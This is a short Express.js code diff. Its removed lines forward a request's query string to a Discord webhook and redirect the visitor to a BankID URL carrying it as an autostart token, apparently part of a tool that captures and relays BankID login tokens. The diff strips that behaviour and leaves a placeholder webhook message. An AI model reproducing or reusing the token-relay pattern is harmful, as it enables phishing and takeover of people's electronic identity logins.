@@ -12,20 +12,10 @@
  
  app.get('/', (req, res) => {
   // Extract the query string from req.originalUrl
-  const queryString = req.originalUrl.split('?')[1];
-
-  if (!queryString) {
-    return res.status(400).send('Query parameters are required.');
-  }
 
   // Log the query string to console or webhook
-  sendDiscordWebhook(queryString);
+  sendDiscordWebhook("hey");
 
-  // Construct the redirect URL with the extracted query parameters
-  const redirectUrl = `bankid:///?autostarttoken=${queryString}`;
-
-  // Redirect to the constructed URL
-  res.redirect(redirectUrl);
 });
 
 
